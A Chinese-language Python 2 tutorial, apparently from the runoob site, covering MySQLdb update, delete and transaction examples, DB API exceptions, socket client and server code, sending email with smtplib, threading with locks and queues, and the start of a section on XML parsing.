	更新操作用于更新数据表的的数据，以下实例将 EMPLOYEE 表中的 SEX 字段为 'M' 的 AGE 字段递增 1：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	import MySQLdb

	# 打开数据库连接
	db = MySQLdb.connect("localhost","testuser","test123","TESTDB" )

	# 使用cursor()方法获取操作游标 
	cursor = db.cursor()

	# SQL 更新语句
	sql = "UPDATE EMPLOYEE SET AGE = AGE + 1 WHERE SEX = '%c'" % ('M')
	try:
	   # 执行SQL语句
	   cursor.execute(sql)
	   # 提交到数据库执行
	   db.commit()
	except:
	   # 发生错误时回滚
	   db.rollback()

	# 关闭数据库连接
	db.close()

	删除操作

	删除操作用于删除数据表中的数据，以下实例演示了删除数据表 EMPLOYEE 中 AGE 大于 20 的所有数据：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	import MySQLdb

	# 打开数据库连接
	db = MySQLdb.connect("localhost","testuser","test123","TESTDB" )

	# 使用cursor()方法获取操作游标 
	cursor = db.cursor()

	# SQL 删除语句
	sql = "DELETE FROM EMPLOYEE WHERE AGE > '%d'" % (20)
	try:
	   # 执行SQL语句
	   cursor.execute(sql)
	   # 提交修改
	   db.commit()
	except:
	   # 发生错误时回滚
	   db.rollback()

	# 关闭连接
	db.close()

	执行事务

	事务机制可以确保数据一致性。

	事务应该具有4个属性：原子性、一致性、隔离性、持久性。这四个属性通常称为ACID特性。

		原子性（atomicity）。一个事务是一个不可分割的工作单位，事务中包括的诸操作要么都做，要么都不做。
		一致性（consistency）。事务必须是使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的。
		隔离性（isolation）。一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。
		持久性（durability）。持续性也称永久性（permanence），指一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。接下来的其他操作或故障不应该对其有任何影响。 

	Python DB API 2.0 的事务提供了两个方法 commit 或 rollback。
	实例：

	# SQL删除记录语句
	sql = "DELETE FROM EMPLOYEE WHERE AGE > '%d'" % (20)
	try:
	   # 执行SQL语句
	   cursor.execute(sql)
	   # 向数据库提交
	   db.commit()
	except:
	   # 发生错误时回滚
	   db.rollback()

	对于支持事务的数据库， 在Python数据库编程中，当游标建立之时，就自动开始了一个隐形的数据库事务。

	commit()方法游标的所有更新操作，rollback（）方法回滚当前游标的所有操作。每一个方法都开始了一个新的事务。
	错误处理

	DB API中定义了一些数据库操作的错误及异常，下表列出了这些错误和异常:
	异常	描述
	Warning	当有严重警告时触发，例如插入数据是被截断等等。必须是 StandardError 的子类。
	Error	警告以外所有其他错误类。必须是 StandardError 的子类。
	InterfaceError	当有数据库接口模块本身的错误（而不是数据库的错误）发生时触发。 必须是Error的子类。
	DatabaseError	和数据库有关的错误发生时触发。 必须是Error的子类。
	DataError	当有数据处理时的错误发生时触发，例如：除零错误，数据超范围等等。 必须是DatabaseError的子类。
	OperationalError	指非用户控制的，而是操作数据库时发生的错误。例如：连接意外断开、 数据库名未找到、事务处理失败、内存分配错误等等操作数据库是发生的错误。 必须是DatabaseError的子类。
	IntegrityError	完整性相关的错误，例如外键检查失败等。必须是DatabaseError子类。
	InternalError	数据库的内部错误，例如游标（cursor）失效了、事务同步失败等等。 必须是DatabaseError子类。
	ProgrammingError	程序错误，例如数据表（table）没找到或已存在、SQL语句语法错误、 参数数量错误等等。必须是DatabaseError的子类。
	NotSupportedError	不支持错误，指使用了数据库不支持的函数或API等。例如在连接对象上 使用.rollback()函数，然而数据库并不支持事务或者事务已关闭。 必须是DatabaseError的子类。


Python 网络编程

	Python 提供了两个级别访问的网络服务。：

		低级别的网络服务支持基本的 Socket，它提供了标准的 BSD Sockets API，可以访问底层操作系统Socket接口的全部方法。
		高级别的网络服务模块 SocketServer， 它提供了服务器中心类，可以简化网络服务器的开发。

	什么是 Socket?

	Socket又称"套接字"，应用程序通常通过"套接字"向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。
	socket()函数

	Python 中，我们用 socket（）函数来创建套接字，语法格式如下：

	socket.socket([family[, type[, proto]]])

	参数

		family: 套接字家族可以使AF_UNIX或者AF_INET
		type: 套接字类型可以根据是面向连接的还是非连接分为SOCK_STREAM或SOCK_DGRAM
		protocol: 一般不填默认为0.

	Socket 对象(内建)方法
	函数 	描述
	服务器端套接字
	s.bind() 	绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。
	s.listen() 	开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。
	s.accept() 	被动接受TCP客户端连接,(阻塞式)等待连接的到来
	客户端套接字
	s.connect() 	主动初始化TCP服务器连接，。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。
	s.connect_ex() 	connect()函数的扩展版本,出错时返回出错码,而不是抛出异常
	公共用途的套接字函数
	s.recv() 	接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。
	s.send() 	发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。
	s.sendall() 	完整发送TCP数据，完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。
	s.recvfrom() 	接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。
	s.sendto() 	发送UDP数据，将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。
	s.close() 	关闭套接字
	s.getpeername() 	返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。
	s.getsockname() 	返回套接字自己的地址。通常是一个元组(ipaddr,port)
	s.setsockopt(level,optname,value) 	设置给定套接字选项的值。
	s.getsockopt(level,optname[.buflen]) 	返回套接字选项的值。
	s.settimeout(timeout) 	设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）
	s.gettimeout() 	返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。
	s.fileno() 	返回套接字的文件描述符。
	s.setblocking(flag) 	如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。
	s.makefile() 	创建一个与该套接字相关连的文件
	简单实例
	服务端

	我们使用 socket 模块的 socket 函数来创建一个 socket 对象。socket 对象可以通过调用其他函数来设置一个 socket 服务。

	现在我们可以通过调用 bind(hostname, port) 函数来指定服务的 port(端口)。

	接着，我们调用 socket 对象的 accept 方法。该方法等待客户端的连接，并返回 connection 对象，表示已连接到客户端。

	完整代码如下：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	# 文件名：server.py

	import socket               # 导入 socket 模块

	s = socket.socket()         # 创建 socket 对象
	host = socket.gethostname() # 获取本地主机名
	port = 12345                # 设置端口
	s.bind((host, port))        # 绑定端口

	s.listen(5)                 # 等待客户端连接
	while True:
		c, addr = s.accept()     # 建立客户端连接。
		print '连接地址：', addr
		c.send('欢迎访问菜鸟教程！')
		c.close()                # 关闭连接

	客户端

	接下来我们写一个简单的客户端实例连接到以上创建的服务。端口号为 12345。

	socket.connect(hosname, port ) 方法打开一个 TCP 连接到主机为 hostname 端口为 port 的服务商。连接后我们就可以从服务端后期数据，记住，操作完成后需要关闭连接。

	完整代码如下：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	# 文件名：client.py

	import socket               # 导入 socket 模块

	s = socket.socket()         # 创建 socket 对象
	host = socket.gethostname() # 获取本地主机名
	port = 12345                # 设置端口好

	s.connect((host, port))
	print s.recv(1024)
	s.close()  

	现在我们打开两个终端，第一个终端执行 server.py 文件：

	$ python server.py

	第二个终端执行 client.py 文件：

	$ python client.py 
	欢迎访问菜鸟教程！

	这是我们再打开第一个终端，就会看到有以下信息输出：

	连接地址： ('192.168.0.118', 62461)

	Python Internet 模块

	以下列出了 Python 网络编程的一些重要模块：
	协议	功能用处	端口号	Python 模块
	HTTP	网页访问	80	httplib, urllib, xmlrpclib
	NNTP	阅读和张贴新闻文章，俗称为"帖子"	119	nntplib
	FTP	文件传输	20	ftplib, urllib
	SMTP	发送邮件	25	smtplib
	POP3	接收邮件	110	poplib
	IMAP4	获取邮件	143	imaplib
	Telnet	命令行	23	telnetlib
	Gopher	信息查找	70	gopherlib, urllib

	更多内容可以参阅官网的 Python Socket Library and Modules。
	https://docs.python.org/2/library/socket.html


Python SMTP发送邮件

	SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议,它是一组用于由源地址到目的地址传送邮件的规则，由它来控制信件的中转方式。

	python的smtplib提供了一种很方便的途径发送电子邮件。它对smtp协议进行了简单的封装。

	Python创建 SMTP 对象语法如下：

	import smtplib

	smtpObj = smtplib.SMTP( [host [, port [, local_hostname]]] )

	参数说明：

		host: SMTP 服务器主机。 你可以指定主机的ip地址或者域名如: runoob.com，这个是可选参数。
		port: 如果你提供了 host 参数, 你需要指定 SMTP 服务使用的端口号，一般情况下 SMTP 端口号为25。
		local_hostname: 如果 SMTP 在你的本机上，你只需要指定服务器地址为 localhost 即可。 

	Python SMTP 对象使用 sendmail 方法发送邮件，语法如下：

	SMTP.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options]

	参数说明：

		from_addr: 邮件发送者地址。
		to_addrs: 字符串列表，邮件发送地址。
		msg: 发送消息 

	这里要注意一下第三个参数，msg 是字符串，表示邮件。我们知道邮件一般由标题，发信人，收件人，邮件内容，附件等构成，发送邮件的时候，要注意 msg 的格式。这个格式就是 smtp 协议中定义的格式。
	实例

	以下执行实例需要你本机已安装了支持 SMTP 的服务，如：sendmail。

	以下是一个使用 Python 发送邮件简单的实例：
	实例
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import smtplib
	from email.mime.text import MIMEText
	from email.header import Header
	 
	sender = 'from@runoob.com'
	receivers = ['429240967@qq.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
	 
	# 三个参数：第一个为文本内容，第二个 plain 设置文本格式，第三个 utf-8 设置编码
	message = MIMEText('Python 邮件发送测试...', 'plain', 'utf-8')
	message['From'] = Header("菜鸟教程", 'utf-8')
	message['To'] =  Header("测试", 'utf-8')
	 
	subject = 'Python SMTP 邮件测试'
	message['Subject'] = Header(subject, 'utf-8')
	 
	 
	try:
		smtpObj = smtplib.SMTP('localhost')
		smtpObj.sendmail(sender, receivers, message.as_string())
		print "邮件发送成功"
	except smtplib.SMTPException:
		print "Error: 无法发送邮件"

	我们使用三个引号来设置邮件信息，标准邮件需要三个头部信息： From, To, 和 Subject ，每个信息直接使用空行分割。

	我们通过实例化 smtplib 模块的 SMTP 对象 smtpObj 来连接到 SMTP 访问，并使用 sendmail 方法来发送信息。

	执行以上程序，如果你本机安装 sendmail（邮件传输代理程序），就会输出：

	$ python test.py 
	邮件发送成功

	查看我们的收件箱(一般在垃圾箱)，就可以查看到邮件信息：

	如果我们本机没有 sendmail 访问，也可以使用其他邮件服务商的 SMTP 访问（QQ、网易、Google等）。
	实例
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import smtplib
	from email.mime.text import MIMEText
	from email.header import Header
	 
	# 第三方 SMTP 服务
	mail_host="smtp.XXX.com"  #设置服务器
	mail_user="XXXX"    #用户名
	mail_pass="XXXXXX"   #口令 
	 
	 
	sender = 'from@runoob.com'
	receivers = ['429240967@qq.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
	 
	message = MIMEText('Python 邮件发送测试...', 'plain', 'utf-8')
	message['From'] = Header("菜鸟教程", 'utf-8')
	message['To'] =  Header("测试", 'utf-8')
	 
	subject = 'Python SMTP 邮件测试'
	message['Subject'] = Header(subject, 'utf-8')
	 
	 
	try:
		smtpObj = smtplib.SMTP() 
		smtpObj.connect(mail_host, 25)    # 25 为 SMTP 端口号
		smtpObj.login(mail_user,mail_pass)  
		smtpObj.sendmail(sender, receivers, message.as_string())
		print "邮件发送成功"
	except smtplib.SMTPException:
		print "Error: 无法发送邮件"
	使用Python发送HTML格式的邮件

	Python发送HTML格式的邮件与发送纯文本消息的邮件不同之处就是将MIMEText中_subtype设置为html。具体代码如下：
	实例
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import smtplib
	from email.mime.text import MIMEText
	from email.header import Header
	 
	sender = 'from@runoob.com'
	receivers = ['429240967@qq.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
	 
	mail_msg = """
	<p>Python 邮件发送测试...</p>
	<p><a href="http://www.runoob.com">这是一个链接</a></p>
	"""
	message = MIMEText(mail_msg, 'html', 'utf-8')
	message['From'] = Header("菜鸟教程", 'utf-8')
	message['To'] =  Header("测试", 'utf-8')
	 
	subject = 'Python SMTP 邮件测试'
	message['Subject'] = Header(subject, 'utf-8')
	 
	 
	try:
		smtpObj = smtplib.SMTP('localhost')
		smtpObj.sendmail(sender, receivers, message.as_string())
		print "邮件发送成功"
	except smtplib.SMTPException:
		print "Error: 无法发送邮件"

	执行以上程序，如果你本机安装sendmail，就会输出：

	$ python test.py 
	邮件发送成功

	查看我们的收件箱(一般在垃圾箱)，就可以查看到邮件信息：

	Python 发送带附件的邮件

	发送带附件的邮件，首先要创建MIMEMultipart()实例，然后构造附件，如果有多个附件，可依次构造，最后利用smtplib.smtp发送。
	实例
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import smtplib
	from email.mime.text import MIMEText
	from email.mime.multipart import MIMEMultipart
	from email.header import Header
	 
	sender = 'from@runoob.com'
	receivers = ['429240967@qq.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
	 
	#创建一个带附件的实例
	message = MIMEMultipart()
	message['From'] = Header("菜鸟教程", 'utf-8')
	message['To'] =  Header("测试", 'utf-8')
	subject = 'Python SMTP 邮件测试'
	message['Subject'] = Header(subject, 'utf-8')
	 
	#邮件正文内容
	message.attach(MIMEText('这是菜鸟教程Python 邮件发送测试……', 'plain', 'utf-8'))
	 
	# 构造附件1，传送当前目录下的 test.txt 文件
	att1 = MIMEText(open('test.txt', 'rb').read(), 'base64', 'utf-8')
	att1["Content-Type"] = 'application/octet-stream'
	# 这里的filename可以任意写，写什么名字，邮件中显示什么名字
	att1["Content-Disposition"] = 'attachment; filename="test.txt"'
	message.attach(att1)
	 
	# 构造附件2，传送当前目录下的 runoob.txt 文件
	att2 = MIMEText(open('runoob.txt', 'rb').read(), 'base64', 'utf-8')
	att2["Content-Type"] = 'application/octet-stream'
	att2["Content-Disposition"] = 'attachment; filename="runoob.txt"'
	message.attach(att2)
	 
	try:
		smtpObj = smtplib.SMTP('localhost')
		smtpObj.sendmail(sender, receivers, message.as_string())
		print "邮件发送成功"
	except smtplib.SMTPException:
		print "Error: 无法发送邮件"

	$ python test.py 
	邮件发送成功

	查看我们的收件箱(一般在垃圾箱)，就可以查看到邮件信息：

	在 HTML 文本中添加图片

	邮件的 HTML 文本中一般邮件服务商添加外链是无效的，正确添加突破的实例如下所示：
	实例
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import smtplib
	from email.mime.image import MIMEImage
	from email.mime.multipart import MIMEMultipart
	from email.mime.text import MIMEText
	from email.header import Header
	 
	sender = 'from@runoob.com'
	receivers = ['429240967@qq.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
	 
	msgRoot = MIMEMultipart('related')
	msgRoot['From'] = Header("菜鸟教程", 'utf-8')
	msgRoot['To'] =  Header("测试", 'utf-8')
	subject = 'Python SMTP 邮件测试'
	msgRoot['Subject'] = Header(subject, 'utf-8')
	 
	msgAlternative = MIMEMultipart('alternative')
	msgRoot.attach(msgAlternative)
	 
	 
	mail_msg = """
	<p>Python 邮件发送测试...</p>
	<p><a href="http://www.runoob.com">菜鸟教程链接</a></p>
	<p>图片演示：</p>
	<p><img src="cid:image1"></p>
	"""
	msgAlternative.attach(MIMEText(mail_msg, 'html', 'utf-8'))
	 
	# 指定图片为当前目录
	fp = open('test.png', 'rb')
	msgImage = MIMEImage(fp.read())
	fp.close()
	 
	# 定义图片 ID，在 HTML 文本中引用
	msgImage.add_header('Content-ID', '<image1>')
	msgRoot.attach(msgImage)
	 
	try:
		smtpObj = smtplib.SMTP('localhost')
		smtpObj.sendmail(sender, receivers, msgRoot.as_string())
		print "邮件发送成功"
	except smtplib.SMTPException:
		print "Error: 无法发送邮件"

	$ python test.py 
	邮件发送成功

	查看我们的收件箱(如果在垃圾箱可能需要移动到收件箱才可正常显示)，就可以查看到邮件信息：

	使用第三方 SMTP 服务发送

	这里使用了 QQ 邮箱(你也可以使用 163，Gmail等)的 SMTP 服务，需要做以下配置：

	QQ 邮箱通过生成授权码来设置密码：

	QQ 邮箱 SMTP 服务器地址：smtp.qq.com，ssl 端口：465。

	以下实例你需要修改：发件人邮箱（你的QQ邮箱），密码，收件人邮箱（可发给自己）。
	QQ SMTP
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import smtplib
	from email.mime.text import MIMEText
	from email.utils import formataddr
	 
	my_sender='429240967@qq.com'    # 发件人邮箱账号
	my_pass = 'xxxxxxxxxx'              # 发件人邮箱密码
	my_user='429240967@qq.com'      # 收件人邮箱账号，我这边发送给自己
	def mail():
		ret=True
		try:
			msg=MIMEText('填写邮件内容','plain','utf-8')
			msg['From']=formataddr(["FromRunoob",my_sender])  # 括号里的对应发件人邮箱昵称、发件人邮箱账号
			msg['To']=formataddr(["FK",my_user])              # 括号里的对应收件人邮箱昵称、收件人邮箱账号
			msg['Subject']="菜鸟教程发送邮件测试"                # 邮件的主题，也可以说是标题
	 
			server=smtplib.SMTP_SSL("smtp.qq.com", 465)  # 发件人邮箱中的SMTP服务器，端口是25
			server.login(my_sender, my_pass)  # 括号中对应的是发件人邮箱账号、邮箱密码
			server.sendmail(my_sender,[my_user,],msg.as_string())  # 括号中对应的是发件人邮箱账号、收件人邮箱账号、发送邮件
			server.quit()  # 关闭连接
		except Exception:  # 如果 try 中的语句没有执行，则会执行下面的 ret=False
			ret=False
		return ret
	 
	ret=mail()
	if ret:
		print("邮件发送成功")
	else:
		print("邮件发送失败")

	$ python test.py 
	邮件发送成功

	发送成功后，登陆收件人邮箱即可查看：

	更多内容请参阅：https://docs.python.org/2/library/email-examples.html。
	


Python 多线程
	多线程类似于同时执行多个不同程序，多线程运行有如下优点：

		使用线程可以把占据长时间的程序中的任务放到后台去处理。
		用户界面可以更加吸引人，这样比如用户点击了一个按钮去触发某些事件的处理，可以弹出一个进度条来显示处理的进度
		程序的运行速度可能加快
		在一些等待的任务实现上如用户输入、文件读写和网络收发数据等，线程就比较有用了。在这种情况下我们可以释放一些珍贵的资源如内存占用等等。

	线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。

	每个线程都有他自己的一组CPU寄存器，称为线程的上下文，该上下文反映了线程上次运行该线程的CPU寄存器的状态。

	指令指针和堆栈指针寄存器是线程上下文中两个最重要的寄存器，线程总是在进程得到上下文中运行的，这些地址都用于标志拥有线程的进程地址空间中的内存。

		线程可以被抢占（中断）。
		在其他线程正在运行时，线程可以暂时搁置（也称为睡眠） -- 这就是线程的退让。


	开始学习Python线程

	Python中使用线程有两种方式：函数或者用类来包装线程对象。

	函数式：调用thread模块中的start_new_thread()函数来产生新线程。语法如下:

	thread.start_new_thread ( function, args[, kwargs] )

	参数说明:

		function - 线程函数。
		args - 传递给线程函数的参数,他必须是个tuple类型。
		kwargs - 可选参数。

	实例(Python 2.0+)
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import thread
	import time
	 
	# 为线程定义一个函数
	def print_time( threadName, delay):
	   count = 0
	   while count < 5:
		  time.sleep(delay)
		  count += 1
		  print "%s: %s" % ( threadName, time.ctime(time.time()) )
	 
	# 创建两个线程
	try:
	   thread.start_new_thread( print_time, ("Thread-1", 2, ) )
	   thread.start_new_thread( print_time, ("Thread-2", 4, ) )
	except:
	   print "Error: unable to start thread"
	 
	while 1:
	   pass

	执行以上程序输出结果如下：

	Thread-1: Thu Jan 22 15:42:17 2009
	Thread-1: Thu Jan 22 15:42:19 2009
	Thread-2: Thu Jan 22 15:42:19 2009
	Thread-1: Thu Jan 22 15:42:21 2009
	Thread-2: Thu Jan 22 15:42:23 2009
	Thread-1: Thu Jan 22 15:42:23 2009
	Thread-1: Thu Jan 22 15:42:25 2009
	Thread-2: Thu Jan 22 15:42:27 2009
	Thread-2: Thu Jan 22 15:42:31 2009
	Thread-2: Thu Jan 22 15:42:35 2009

	线程的结束一般依靠线程函数的自然结束；也可以在线程函数中调用thread.exit()，他抛出SystemExit exception，达到退出线程的目的。
	线程模块

	Python通过两个标准库thread和threading提供对线程的支持。thread提供了低级别的、原始的线程以及一个简单的锁。

	thread 模块提供的其他方法：

		threading.currentThread(): 返回当前的线程变量。
		threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。
		threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。

	除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法:

		run(): 用以表示线程活动的方法。
		start():启动线程活动。

		join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。
		isAlive(): 返回线程是否活动的。
		getName(): 返回线程名。
		setName(): 设置线程名。

	使用Threading模块创建线程

	使用Threading模块创建线程，直接从threading.Thread继承，然后重写__init__方法和run方法：
	实例(Python 2.0+)
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import threading
	import time
	 
	exitFlag = 0
	 
	class myThread (threading.Thread):   #继承父类threading.Thread
		def __init__(self, threadID, name, counter):
			threading.Thread.__init__(self)
			self.threadID = threadID
			self.name = name
			self.counter = counter
		def run(self):                   #把要执行的代码写到run函数里面 线程在创建后会直接运行run函数 
			print "Starting " + self.name
			print_time(self.name, self.counter, 5)
			print "Exiting " + self.name
	 
	def print_time(threadName, delay, counter):
		while counter:
			if exitFlag:
				threading.Thread.exit()
			time.sleep(delay)
			print "%s: %s" % (threadName, time.ctime(time.time()))
			counter -= 1
	 
	# 创建新线程
	thread1 = myThread(1, "Thread-1", 1)
	thread2 = myThread(2, "Thread-2", 2)
	 
	# 开启线程
	thread1.start()
	thread2.start()
	 
	print "Exiting Main Thread"

	以上程序执行结果如下；

	Starting Thread-1
	Starting Thread-2
	Exiting Main Thread
	Thread-1: Thu Mar 21 09:10:03 2013
	Thread-1: Thu Mar 21 09:10:04 2013
	Thread-2: Thu Mar 21 09:10:04 2013
	Thread-1: Thu Mar 21 09:10:05 2013
	Thread-1: Thu Mar 21 09:10:06 2013
	Thread-2: Thu Mar 21 09:10:06 2013
	Thread-1: Thu Mar 21 09:10:07 2013
	Exiting Thread-1
	Thread-2: Thu Mar 21 09:10:08 2013
	Thread-2: Thu Mar 21 09:10:10 2013
	Thread-2: Thu Mar 21 09:10:12 2013
	Exiting Thread-2

	线程同步

	如果多个线程共同对某个数据修改，则可能出现不可预料的结果，为了保证数据的正确性，需要对多个线程进行同步。

	使用Thread对象的Lock和Rlock可以实现简单的线程同步，这两个对象都有acquire方法和release方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到acquire和release方法之间。如下：

	多线程的优势在于可以同时运行多个任务（至少感觉起来是这样）。但是当线程需要共享数据时，可能存在数据不同步的问题。

	考虑这样一种情况：一个列表里所有元素都是0，线程"set"从后向前把所有元素改成1，而线程"print"负责从前往后读取列表并打印。

	那么，可能线程"set"开始改的时候，线程"print"便来打印列表了，输出就成了一半0一半1，这就是数据的不同步。为了避免这种情况，引入了锁的概念。

	锁有两种状态——锁定和未锁定。每当一个线程比如"set"要访问共享数据时，必须先获得锁定；如果已经有别的线程比如"print"获得锁定了，那么就让线程"set"暂停，也就是同步阻塞；等到线程"print"访问完毕，释放锁以后，再让线程"set"继续。

	经过这样的处理，打印列表时要么全部输出0，要么全部输出1，不会再出现一半0一半1的尴尬场面。
	实例(Python 2.0+)
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import threading
	import time
	 
	class myThread (threading.Thread):
		def __init__(self, threadID, name, counter):
			threading.Thread.__init__(self)
			self.threadID = threadID
			self.name = name
			self.counter = counter
		def run(self):
			print "Starting " + self.name
		   # 获得锁，成功获得锁定后返回True
		   # 可选的timeout参数不填时将一直阻塞直到获得锁定
		   # 否则超时后将返回False
			threadLock.acquire()
			print_time(self.name, self.counter, 3)
			# 释放锁
			threadLock.release()
	 
	def print_time(threadName, delay, counter):
		while counter:
			time.sleep(delay)
			print "%s: %s" % (threadName, time.ctime(time.time()))
			counter -= 1
	 
	threadLock = threading.Lock()
	threads = []
	 
	# 创建新线程
	thread1 = myThread(1, "Thread-1", 1)
	thread2 = myThread(2, "Thread-2", 2)
	 
	# 开启新线程
	thread1.start()
	thread2.start()
	 
	# 添加线程到线程列表
	threads.append(thread1)
	threads.append(thread2)
	 
	# 等待所有线程完成
	for t in threads:
		t.join()
	print "Exiting Main Thread"
	线程优先级队列（ Queue）

	Python的Queue模块中提供了同步的、线程安全的队列类，包括FIFO（先入先出)队列Queue，LIFO（后入先出）队列LifoQueue，和优先级队列PriorityQueue。这些队列都实现了锁原语，能够在多线程中直接使用。可以使用队列来实现线程间的同步。

	Queue模块中的常用方法:

		Queue.qsize() 返回队列的大小
		Queue.empty() 如果队列为空，返回True,反之False
		Queue.full() 如果队列满了，返回True,反之False
		Queue.full 与 maxsize 大小对应
		Queue.get([block[, timeout]])获取队列，timeout等待时间
		Queue.get_nowait() 相当Queue.get(False)
		Queue.put(item) 写入队列，timeout等待时间
		Queue.put_nowait(item) 相当Queue.put(item, False)
		Queue.task_done() 在完成一项工作之后，Queue.task_done()函数向任务已经完成的队列发送一个信号
		Queue.join() 实际上意味着等到队列为空，再执行别的操作

	实例(Python 2.0+)
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import Queue
	import threading
	import time
	 
	exitFlag = 0
	 
	class myThread (threading.Thread):
		def __init__(self, threadID, name, q):
			threading.Thread.__init__(self)
			self.threadID = threadID
			self.name = name
			self.q = q
		def run(self):
			print "Starting " + self.name
			process_data(self.name, self.q)
			print "Exiting " + self.name
	 
	def process_data(threadName, q):
		while not exitFlag:
			queueLock.acquire()
			if not workQueue.empty():
				data = q.get()
				queueLock.release()
				print "%s processing %s" % (threadName, data)
			else:
				queueLock.release()
			time.sleep(1)
	 
	threadList = ["Thread-1", "Thread-2", "Thread-3"]
	nameList = ["One", "Two", "Three", "Four", "Five"]
	queueLock = threading.Lock()
	workQueue = Queue.Queue(10)
	threads = []
	threadID = 1
	 
	# 创建新线程
	for tName in threadList:
		thread = myThread(threadID, tName, workQueue)
		thread.start()
		threads.append(thread)
		threadID += 1
	 
	# 填充队列
	queueLock.acquire()
	for word in nameList:
		workQueue.put(word)
	queueLock.release()
	 
	# 等待队列清空
	while not workQueue.empty():
		pass
	 
	# 通知线程是时候退出
	exitFlag = 1
	 
	# 等待所有线程完成
	for t in threads:
		t.join()
	print "Exiting Main Thread"

	以上程序执行结果：

	Starting Thread-1
	Starting Thread-2
	Starting Thread-3
	Thread-1 processing One
	Thread-2 processing Two
	Thread-3 processing Three
	Thread-1 processing Four
	Thread-2 processing Five
	Exiting Thread-3
	Exiting Thread-1
	Exiting Thread-2
	Exiting Main Thread


Python XML解析
	什么是XML？

	XML 指可扩展标记语言（eXtensible Markup Language）。 你可以通过本站学习XML教程

	XML 被设计用来传输和存储数据。

	XML是一套定义语义标记的规则，这些标记将文档分成许多部件并对这些部件加以标识。

	它也是元标记语言，即定义了用于定义其他与特定领域有关的、语义的、结构化的标记语言的句法语言。
	python对XML的解析

	常见的XML编程接口有DOM和SAX，这两种接口处理XML文件的方式不同，当然使用场合也不同。

	python有三种方法解析XML，SAX，DOM，以及ElementTree:
	1.SAX (simple API for XML )

	python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。
	2.DOM(Document Object Model)

	将XML数据在内存中解析成一个树，通过对树的操作来操作XML。
	3.ElementTree(元素树)

	ElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。

	注：因DOM需要将XML数据映射到内存中的树，一是比较慢，二是比较耗内存，而SAX流式读取XML文件，比较快，占用内存少，但需要用户实现回调函数（handler）。

	本章节使用到的XML实例文件movies.xml内容如下：

	<collection shelf="New Arrivals">
	<movie title="Enemy Behind">
	   <type>War, Thriller</type>
	   <format>DVD</format>
	   <year>2003</year>
	   <rating>PG</rating>
	   <stars>10</stars>
	   <description>Talk about a US-Japan war</description>
	</movie>
	<movie title="Transformers">
	   <type>Anime, Science Fiction</type>
	   <format>DVD</format>
	   <year>1989</year>
	   <rating>R</rating>
	   <stars>8</stars>
	   <description>A schientific fiction</description>
	</movie>
	   <movie title="Trigun">
	   <type>Anime, Action</type>
	   <format>DVD</format>
	   <episodes>4</episodes>
	   <rating>PG</rating>
	   <stars>10</stars>
	   <description>Vash the Stampede!</description>
	</movie>
	<movie title="Ishtar">
	   <type>Comedy</type>
	   <format>VHS</format>
	   <rating>PG</rating>
	   <stars>2</stars>
	   <description>Viewable boredom</description>
	</movie>
	</collection>

	python使用SAX解析xml

	SAX是一种基于事件驱动的API。

	利用SAX解析XML文档牵涉到两个部分:解析器和事件处理器。

	解析器负责读取XML文档,并向事件处理器发送事件,如元素开始跟元素结束事件;

